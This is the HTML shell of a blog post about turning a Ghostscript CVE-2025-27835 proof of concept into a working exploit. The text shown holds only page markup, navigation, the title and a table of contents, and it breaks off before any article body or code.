<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Making Ghostscript CVE-2025-27835 PoC Usable &middot; Richard&#39;s Blog</title>
  <meta name="title" content="Making Ghostscript CVE-2025-27835 PoC Usable &middot; Richard&#39;s Blog" />
  
  <meta name="description" content="a description" />
  <meta name="keywords" content="Ghostscript, " />
  
  
  <link rel="canonical" href="http://localhost:1313/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e4a694b744929a759a0c151321fd6ff5de4ee3b4bfe86bbcbc00eca8690e25cc68e0a260316dcec6b6b419ada9c851205633ce9ff6bc7c630088b448f3320ba7.css"
    integrity="sha512-5KaUt0SSmnWaDBUTIf1v9d5O47S/6Gu8vADsqGkOJcxo4KJgMW3Oxra0Ga2pyFEgVjPOn/a8fGMAiLRI8zILpw==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.dc15078f1fe553ce354f85ec1bfce7ded8b4060d4124a49b19e31dd64345b8d8f03edbbb1b681748650181f9d81da9728ca10c2b9cb2ae7bf8983d4b669ba876.js"
    integrity="sha512-3BUHjx/lU841T4XsG/zn3ti0Bg1BJKSbGeMd1kNFuNjwPtu7G2gXSGUBgfnYHalyjKEMK5yyrnv4mD1LZpuodg==" data-copy="Copy" data-copied="Copied"></script>
  
  
  
  <script src="/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj&#43;Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/">
  <meta property="og:site_name" content="Richard&#39;s Blog">
  <meta property="og:title" content="Making Ghostscript CVE-2025-27835 PoC Usable">
  <meta property="og:description" content="a description">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-27T00:00:00+00:00">
    <meta property="article:tag" content="Ghostscript">
    <meta property="og:image" content="http://localhost:1313/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/featured.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/featured.png">
  <meta name="twitter:title" content="Making Ghostscript CVE-2025-27835 PoC Usable">
  <meta name="twitter:description" content="a description">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Making Ghostscript CVE-2025-27835 PoC Usable",
    "headline": "Making Ghostscript CVE-2025-27835 PoC Usable",
    "description": "a description",
    
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/1752023247845-making-ghostscript-cve-2025-27835-poc-usable\/",
    "author" : {
      "@type": "Person",
      "name": "Richard Guizar"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-06-27T00:00:00\u002b00:00",
    "datePublished": "2025-06-27T00:00:00\u002b00:00",
    
    "dateModified": "2025-06-27T00:00:00\u002b00:00",
    
    "keywords": ["Ghostscript"],
    
    "mainEntityOfPage": "true",
    "wordCount": "5894"
  }]
  </script>


  
  
  <meta name="author" content="Richard Guizar" />
  
  
  
  
  <link href="https://github.com/r-guizar" rel="me" />
  
  
  
  
  <link href="https://www.linkedin.com/in/richard-guizar-2830072a3/" rel="me" />
  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>






















  
  




  
  
  
  
  <meta name="theme-color"/>
  
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
      >
    </div>
    
    
      <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-index-100">
  <div
    id="menu-blur"
    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    <div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 padding-main-menu">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Richard&rsquo;s Blog</a>
            

        </nav>
        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">

            
            
            
  <a
  href="/posts/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Posts">
    Posts
  </p>
</a>



            
            
  <a
  href="https://github.com/r-guizar"
  target="_blank"
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


    </span>
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



            
            
  <a
  href="https://www.linkedin.com/in/richard-guizar-2830072a3/"
  target="_blank"
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>


    </span>
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



            
            
  <a
  href=""
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class=" flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 padding-top-[5px]">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
  <a
    href="/posts/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Posts">
      Posts
    </p>
  </a>
</li>




                    

                    
  <li class="mt-1">
  <a
    href="https://github.com/r-guizar"
    
      target="_blank"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


      </div>
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>




                    

                    
  <li class="mt-1">
  <a
    href="https://www.linkedin.com/in/richard-guizar-2830072a3/"
    
      target="_blank"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>


      </div>
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>




                    

                    
  <li class="mt-1">
  <a
    href=""
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>




<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>


  </div>
</div>


<script
  type="text/javascript"
  src="/js/background-blur.min.4812321520cc2e4cd52bf9137015a55bb6c0b5e66a6b2c96b8654c0ec99be59e8e6425dd838a6fd9bac54000586f37f4a9680bbefaa2aee4601a69e188005cf6.js"
  integrity="sha512-SBIyFSDMLkzVK/kTcBWlW7bAteZqayyWuGVMDsmb5Z6OZCXdg4pv2brFQABYbzf0qWgLvvqiruRgGmnhiABc9g=="
  data-target-id="menu-blur"></script>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  


  <article>
    
      
      
      
      
        
    
      <div
        class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom"
        style="background-image:url(/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/featured_hu_3d59974b5eab634c.png);"></div>
    
  
      
    


    <header id="single_header" class="mt-5 max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
      >Richard&#39;s Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/"
      >Making Ghostscript CVE-2025-27835 PoC Usable</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Making Ghostscript CVE-2025-27835 PoC Usable
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  

  
  
    
  

  
    
  

  

  

  

  

  

  

  

  
    
  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-06-27T00:00:00&#43;00:00">27 June 2025</time><span class="px-2 text-primary-500">&middot;</span>



<script
  type="text/javascript"
  src="/js/zen-mode.min.2a0a1375509c03daf41c53a9831aa2d560895b7a2528c3eb3b56e7b11a135c7529e49727162a053b6193be8340270a8342f42c69f3d7e262ae54bc248eaac8f5.js"
  integrity="sha512-KgoTdVCcA9r0HFOpgxqi1WCJW3olKMPrO1bnsRoTXHUp5JcnFioFO2GTvoNAJwqDQvQsafPX4mKuVLwkjqrI9Q=="></script>

<span class="mb-[2px]">
  <span
    id="zen-mode-button"
    class="text-lg hover:text-primary-500"
    title="Enable zen mode"
    data-title-i18n-disable="Enable zen mode"
    data-title-i18n-enable="Disable zen mode">
    <span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
</svg>
  </span>

</span>
  </span>
</span>

    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <span
                class="mr-2 margin-top-[0.5rem]"
                onclick="window.open(&#34;/tags/ghostscript/&#34;,'_self');return false;">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ghostscript
  </span>
</span>

              </span>
            
          
        
      
    </div>
  

  
  



      </div>

      
      
      
      
      

      

      

        

        

        

      

    </header>

    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
          <div
            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]
            
            ">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#understanding-the-crash">Understanding the Crash</a></li>
    <li><a href="#a-new-approach">A New Approach</a></li>
    <li><a href="#writing-to-arbitrary-memory">Writing to Arbitrary Memory</a>
      <ul>
        <li><a href="#getting-the-address-to-write-to">Getting the Address to Write To</a></li>
        <li><a href="#writing-to-the-address">Writing to the Address</a></li>
      </ul>
    </li>
    <li><a href="#turning-aslr-on">Turning ASLR On</a></li>
    <li><a href="#fixing-the-refcount-error">Fixing the Refcount Error</a></li>
    <li><a href="#removing-debug-symbols">Removing Debug Symbols</a></li>
    <li><a href="#final-exploit-code">Final Exploit Code</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#understanding-the-crash">Understanding the Crash</a></li>
    <li><a href="#a-new-approach">A New Approach</a></li>
